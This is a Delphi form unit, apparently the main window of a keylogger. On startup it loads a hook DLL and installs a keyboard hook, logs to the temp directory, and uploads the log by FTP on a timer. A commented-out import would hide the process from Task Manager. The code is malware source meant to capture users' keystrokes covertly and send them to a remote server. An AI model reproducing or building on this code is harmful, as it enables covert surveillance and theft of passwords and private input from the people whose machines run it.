unit MainFrm;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, KLLogToFile, Vcl.ExtCtrls,
  KLConst;

//function HideProcess(pid: DWORD; HideOnlyFromTaskManager: BOOL): BOOL; stdcall;
//  external 'KLHideTaskLib.dll';

type
  TMainForm = class(TForm)
    btnHook: TButton;
    btnUnhook: TButton;
    Edit1: TEdit;
    Button1: TButton;
    Timer: TTimer;
    procedure btnHookClick(Sender: TObject);
    procedure btnUnhookClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure TimerTimer(Sender: TObject);
  private
    procedure Hook;
    procedure Unhook;
    function GetPathToTempDirectory: string;
  public
    { Public declarations }
  end;

var
  MainForm: TMainForm;
  DLL: THandle;
  SetHook: procedure(ASwitch: Boolean; AMainProg: HWND) stdcall;
  KLLog: TKLLog;

implementation

uses
  KLUtils, System.UITypes;

{$R *.dfm}

procedure TMainForm.btnHookClick(Sender: TObject);
begin
  Hook;
  Timer.Interval := MSecsPerSec * SecsPerMin * FTP_UPLOAD_INTERVAL_MIN;
  FTPUpload;
  Edit1.Text := GetPathToTempDirectory + KL_LOG_NAME + '.log';
  btnHook.Enabled := False;
  btnUnhook.Enabled := True;
end;

procedure TMainForm.btnUnhookClick(Sender: TObject);
begin
  Unhook;
  btnHook.Enabled := True;
  btnUnhook.Enabled := False;
end;

procedure TMainForm.Button1Click(Sender: TObject);
begin
  FTPUpload;
end;

procedure TMainForm.FormCreate(Sender: TObject);
begin
  btnHookClick(nil);
end;

function TMainForm.GetPathToTempDirectory: string;
var
  Buffer: array[0..MAX_PATH] of Char;
begin
  GetTempPath(MAX_PATH - 1, Buffer);
  SetLength(Result, StrLen(Buffer));
  Result := Buffer;
end;

procedure TMainForm.Hook;
begin
  @SetHook := nil;
  DLL := LoadLibrary(PChar(KL_DLL_NAME));
  if DLL > HINSTANCE_ERROR then
    begin
      @SetHook := GetProcAddress(DLL, 'SetHook');
      SetHook(True, Handle);
    end
  else
  begin
    ShowMessage('Ошибка при загрузке DLL!');
    Exit;
  end;
end;

procedure TMainForm.TimerTimer(Sender: TObject);
begin
  FTPUpload;
end;

procedure TMainForm.Unhook;
begin
  @SetHook:= nil;
  if DLL > HINSTANCE_ERROR then
    begin
      @SetHook:=GetProcAddress(DLL, 'SetHook');
      SetHook(False, Handle);
      FreeLibrary(DLL);
    end;
end;

end.
